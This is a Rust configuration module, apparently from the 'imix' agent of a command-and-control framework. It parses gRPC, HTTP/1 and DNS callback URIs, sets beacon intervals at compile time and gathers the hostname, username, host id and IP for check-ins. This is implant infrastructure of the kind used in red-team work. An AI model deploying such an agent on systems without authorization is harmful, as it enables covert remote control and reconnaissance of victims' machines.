use uuid::Uuid;

/// Parsed callback information from the URI
#[derive(Debug, Clone)]
pub struct CallbackInfo {
    pub uri: String,
    pub callback_type: CallbackType,
    pub doh_provider: Option<String>,
    pub proxy_uri: Option<String>,
    pub domain: Option<String>,
    pub query_type: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum CallbackType {
    Grpc,
    Http1,
    Dns,
}

impl CallbackInfo {
    /// Parse a callback URI with query parameters
    /// Format: scheme://host:port?doh=cloudflare&proxy_uri=http://...&domain=...&query_type=...
    pub fn parse(uri_str: &str) -> Result<Self, String> {
        // Split on '?' to separate base URI from query parameters
        let parts: Vec<&str> = uri_str.splitn(2, '?').collect();
        let base_uri = parts[0];

        // Determine callback type from scheme
        let callback_type = if base_uri.starts_with("http://") || base_uri.starts_with("https://") {
            CallbackType::Grpc
        } else if base_uri.starts_with("http1://") || base_uri.starts_with("https1://") {
            CallbackType::Http1
        } else if base_uri.starts_with("dns://") {
            CallbackType::Dns
        } else {
            return Err(format!("Unknown callback URI scheme: {}", base_uri));
        };

        // Parse query parameters if present
        let mut doh_provider = None;
        let mut proxy_uri = None;
        let mut domain = None;
        let mut query_type = None;

        if parts.len() > 1 {
            for param in parts[1].split('&') {
                if let Some((key, value)) = param.split_once('=') {
                    match key {
                        "doh" => doh_provider = Some(value.to_string()),
                        "proxy_uri" => {
                            // URL decode the proxy_uri
                            proxy_uri = Some(
                                urlencoding::decode(value)
                                    .map_err(|e| format!("Failed to decode proxy_uri: {}", e))?
                                    .to_string(),
                            );
                        }
                        "domain" => domain = Some(value.to_string()),
                        "query_type" => query_type = Some(value.to_string()),
                        _ => {} // Ignore unknown parameters
                    }
                }
            }
        }

        Ok(CallbackInfo {
            uri: base_uri.to_string(),
            callback_type,
            doh_provider,
            proxy_uri,
            domain,
            query_type,
        })
    }

    /// Parse a list of callback URIs from a semicolon-delimited string
    pub fn parse_list(uri_list: &str) -> Result<Vec<Self>, String> {
        uri_list
            .split(';')
            .filter(|s| !s.is_empty())
            .map(|uri| Self::parse(uri.trim()))
            .collect()
    }
}

/// Config holds values necessary to configure an Agent.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Config {
    #[prost(message, optional, tag = "1")]
    pub info: ::core::option::Option<crate::c2::Beacon>,
    #[prost(string, tag = "2")]
    pub callback_uri: ::prost::alloc::string::String,
    #[prost(string, optional, tag = "3")]
    pub proxy_uri: ::core::option::Option<::prost::alloc::string::String>,
    #[prost(uint64, tag = "4")]
    pub retry_interval: u64,
    #[prost(bool, tag = "5")]
    pub run_once: bool,
}

macro_rules! callback_uri {
    () => {
        match option_env!("IMIX_CALLBACK_URI") {
            Some(uri) => uri,
            None => "http://127.0.0.1:8000",
        }
    };
}

/*
 * Compile-time constant for the agent proxy URI, derived from the IMIX_PROXY_URI environment variable during compilation.
 * Defaults to None if this is unset.
 */
macro_rules! proxy_uri {
    () => {
        option_env!("IMIX_PROXY_URI")
    };
}

/*
 * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
 * Defaults to "http://127.0.0.1:8000/grpc" if this is unset.
 */
pub const CALLBACK_URI: &str = callback_uri!();

macro_rules! callback_interval {
    () => {
        match option_env!("IMIX_CALLBACK_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent retry interval, derived from the IMIX_RETRY_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const CALLBACK_INTERVAL: &str = callback_interval!();

macro_rules! retry_interval {
    () => {
        match option_env!("IMIX_RETRY_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const RETRY_INTERVAL: &str = retry_interval!();

macro_rules! run_once {
    () => {
        match option_env!("IMIX_RUN_ONCE") {
            Some(_) => true,
            None => false,
        }
    };
}

/* Compile-time constant for the agent run once flag, derived from the IMIX_RUN_ONCE environment variable during compilation.
 * Defaults to false if unset.
 */
pub const RUN_ONCE: bool = run_once!();

/*
 * Config methods.
 */
impl Config {
    pub fn default_with_imix_verison(imix_version: &str) -> Self {
        let agent = crate::c2::Agent {
            identifier: format!("imix-v{}", imix_version),
        };

        let selectors = host_unique::defaults();

        let host = crate::c2::Host {
            name: whoami::fallible::hostname().unwrap_or(String::from("")),
            identifier: host_unique::get_id_with_selectors(selectors).to_string(),
            platform: get_host_platform() as i32,
            primary_ip: get_primary_ip(),
        };

        // Try to grab the beacon identitifier from env var, o/w use  a random UUID
        let beacon_id =
            std::env::var("IMIX_BEACON_ID").unwrap_or_else(|_| String::from(Uuid::new_v4()));

        #[cfg(feature = "dns")]
        let transport = crate::c2::beacon::Transport::Dns;
        #[cfg(feature = "http1")]
        let transport = crate::c2::beacon::Transport::Http1;
        #[cfg(feature = "grpc")]
        let transport = crate::c2::beacon::Transport::Grpc;
        #[cfg(not(any(feature = "dns", feature = "http1", feature = "grpc")))]
        let transport = crate::c2::beacon::Transport::Unspecified;

        let info = crate::c2::Beacon {
            identifier: beacon_id,
            principal: whoami::username(),
            interval: match CALLBACK_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to parse callback interval constant, defaulting to 5 seconds: {_err}");

                    5_u64
                }
            },
            transport: transport as i32,
            host: Some(host),
            agent: Some(agent),
        };

        Config {
            info: Some(info),
            callback_uri: String::from(CALLBACK_URI),
            proxy_uri: get_system_proxy(),
            retry_interval: match RETRY_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "failed to parse retry interval constant, defaulting to 5 seconds: {_err}"
                    );

                    5
                }
            },
            run_once: RUN_ONCE,
        }
    }
    pub fn refresh_primary_ip(&mut self) {
        let fresh_ip = get_primary_ip();
        if self
            .info
            .clone()
            .is_some_and(|b| b.host.as_ref().is_some_and(|h| h.primary_ip != fresh_ip))
        {
            match self.info.clone() {
                Some(mut b) => match b.host.as_mut() {
                    Some(h) => {
                        h.primary_ip = fresh_ip;
                    }
                    None => {
                        #[cfg(debug_assertions)]
                        log::error!("host struct was never initialized, failed to set primary ip");
                    }
                },
                None => {
                    #[cfg(debug_assertions)]
                    log::error!("beacon struct was never initialized, failed to set primary ip");
                }
            }
        }
    }
}

fn get_system_proxy() -> Option<String> {
    let proxy_uri_compile_time_override = proxy_uri!();
    if let Some(proxy_uri) = proxy_uri_compile_time_override {
        return Some(proxy_uri.to_string());
    }

    #[cfg(target_os = "linux")]
    {
        match std::env::var("http_proxy") {
            Ok(val) => return Some(val),
            Err(_e) => {
                #[cfg(debug_assertions)]
                log::debug!("Didn't find http_proxy env var: {}", _e);
            }
        }

        match std::env::var("https_proxy") {
            Ok(val) => return Some(val),
            Err(_e) => {
                #[cfg(debug_assertions)]
                log::debug!("Didn't find https_proxy env var: {}", _e);
            }
        }
        None
    }
    #[cfg(target_os = "windows")]
    {
        None
    }
    #[cfg(target_os = "macos")]
    {
        None
    }
    #[cfg(target_os = "freebsd")]
    {
        None
    }
}

/*
 * Returns which Platform imix has been compiled for.
 */
fn get_host_platform() -> crate::c2::host::Platform {
    #[cfg(target_os = "linux")]
    return crate::c2::host::Platform::Linux;

    #[cfg(target_os = "macos")]
    return crate::c2::host::Platform::Macos;

    #[cfg(target_os = "windows")]
    return crate::c2::host::Platform::Windows;

    #[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
    return crate::c2::host::Platform::Bsd;

    #[cfg(all(
        not(target_os = "linux"),
        not(target_os = "macos"),
        not(target_os = "windows"),
        not(target_os = "freebsd"),
        not(target_os = "netbsd"),
        not(target_os = "openbsd"),
    ))]
    return crate::c2::host::Platform::Unspecified;
}

/*
 * Return the first IPv4 address of the default interface as a string.
 * Returns the empty string otherwise.
 */
fn get_primary_ip() -> String {
    match netdev::get_default_interface() {
        Ok(default_interface) => match default_interface.ipv4.first() {
            Some(ip) => ip.addr().to_string(),
            None => String::from(""),
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("failed to get primary ip: {_err}");

            String::from("")
        }
    }
}
